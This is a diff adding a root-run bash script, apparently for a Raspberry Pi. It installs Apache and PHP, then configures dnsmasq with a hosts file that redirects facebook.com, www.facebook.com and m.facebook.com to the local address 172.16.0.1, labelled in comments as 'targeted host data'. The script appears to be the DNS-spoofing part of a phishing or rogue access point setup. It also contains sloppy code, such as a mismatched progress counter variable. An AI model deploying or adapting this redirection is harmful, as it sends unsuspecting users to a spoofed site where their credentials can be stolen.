@@ -1,0 +1,177 @@
+#!/bin/env bash 
+#############################
+#  DO NOT  EDIT THIS FILE  
+#  REFERT TO THE CONGIF FILE 
+#  TO MAKE CHANGE  OR IF YOU HAVE 
+#  A KNOWLEGE ABOUT BASH PROGRAMMING 
+#  YOU CAN GO AHEAD  
+######################################
+
+#!  you need to  run this script as root 
+
+
+ERR_SHELL_OUT=$((2#00001)) 
+UID_ROOT=$((0x0))
+ERR_NO_ROOT=$((0x3E8))
+ubin=/usr/bin/ 
+conf_dir=/etc/  
+DNSMSK=dnsmasq 
+var_run=/var/run/ 
+
+
+declare -a libspkgs 
+libspkgs=(
+    "git"          # fast, scalable, distributed revision control system [prioritary] 
+    "apache2"      # Apache Http Server 
+    "php7.0-curl"  # CURL  Module for Php 
+    "php7.0-fpm"   # Server-side HTML-embedded scripting language (FPM-CGI binary) 
+)
+declare -r libspkgs #locked to read only immutable 
+
+pi::pkgMan () {
+    local raspack=$(find ${ubin} -name aptitude | cut -d"/" -f4) 
+    echo ${raspack::3}  
+} 
+
+
+:initscaling: (){
+    if [[ ${UID} -eq $UID_ROOT ]] ; then 
+        return $UID 
+    else 
+      bail "[only root  is allowed to run the script]" $ERR_NO_ROOT
+ 
+    fi 
+}
+
+
+libspkgs-Install() { 
+    local pretended_dir_loc 
+    declare -A pretended_dir_loc 
+    pretended_dir_loc=(
+        [ubindir]=$ubin 
+        [confdir]=$conf_dir 
+    )
+    local tmp_file=".cache" 
+    if [[ ! -f $tmp_file ]] ; then 
+        prompt "installing missing package running in backgroung "
+        prompt "please wait"  
+        for  lib in ${libspkgs[@]} ; do 
+            for  suspected_dir in ${pretended_dir_loc[@]} ; do
+              
+                if [[ -z $(find $suspected_dir -name ${lib})  ]] ; then 
+                    #echo  "sudo pi::pkgMan install $lib"
+                    sudo $(pi::pkgMan) install $lib --assume-yes
+                    sleep 2 
+                else 
+                    prompt "[ $lib is already installed ]" 
+                fi 
+            done 
+        done  
+    else 
+        prompt "all required libs ate installed"
+    fi 
+} 
+
+
+{ #Configuration Namespace 
+
+  function targetbinded  {
+     # fudge 10 .3 "bingind $DNSMSK hosting"
+echo "no-hosts 
+addn-hosts=${var_run}$DNSMSK/hosts" 
+  } 
+
+  function  host_data { 
+   #fudge  15 .2 "writing  targeted host data"
+echo "127.0.0.1       honey.pot
+172.16.0.1      www.facebook.com
+172.16.0.1      m.facebook.com
+172.16.0.1      facebook.com 
+">$1 
+ }
+
+  enable_dnsmasq_conf () {  
+    prompt "writing  headline"  ; sleep 2 
+    if [[ -f ${conf_dir}$DNSMSK.conf ]] ; then 
+        local file_size=$(wc  ${conf_dir}$DNSMSK.conf | cut -d " " -f2 ) 
+        [[ $file_size -ne 0 ]] && {
+        prompt "$file_size line was pirnted in this file "
+    }||{ 
+        targetbinded  >  ${conf_dir}$DNSMSK.conf 
+    } 
+    else 
+        $(targetbinded > ${conf_dir}$DNSMSK.conf) 
+    fi  
+  } 
+
+  dnsmask_hosts(){ 
+
+    if [[ -d ${var_run}$DNSMSK  ]] ; then  
+        local host_file_size=$(wc ${var_run}$DNSMSK/hosts | cut -d " " -f3 )
+        [[ $host_file_size -ne 0  ]] && [[  -f $var_run$DNSMSK/host ]] && {
+          prompt "$host_file_size lines was affected " 
+        } || {
+          prompt "write target hosted " sleep 2 
+          host_data  ${var_run}$DNSMSK/hosts 
+        } 
+    else
+        mkdir ${var_run}$DNSMSK 
+        dnsmask_hosts 
+    fi  
+  } 
+
+
+}
+
+
+function printHeadscript {
+    sed -n 1,6p $0 
+}
+
+function prompt {
+    if  [[ -n $1 ]] ; then 
+        echo  -e "* $1" 
+    else  
+        echo -e "..."
+    fi 
+}
+
+function bail {
+    if [[ -z $1 ]] ; then 
+       prompt " something wrong" 
+       exit $ERR_SHELL_OUT
+   else
+       if [[ -n $2 ]] ; then 
+         prompt "$1" ; exit $2 
+       fi   
+      prompt "$1" ; exit $ERR_SHELL_OUT  
+  fi
+}
+
+
+fudge() { 
+
+    local char="▇" 
+    local Limite_rate=100
+    local stater=0
+    local status="" 
+    [[ -n $2 ]] && { 
+        sleep $2
+    }|| {
+        echo "rock yourself " 
+        return 0 
+    }
+    [[ -n $3 ]] && prompt "$3 ..." 
+    echo -en "$b_CGSC|"
+    while [ $Limite_rate -gt $1 ] ; do
+        printf  "$char" && sleep $2 
+        starter=$((starter +1)) 
+        if [[  $starter -eq $1 ]] ; then 
+            echo -en "|100 % [done] $CDEF"
+            echo 
+            return 0 
+        fi 
+    done
+
+}
+
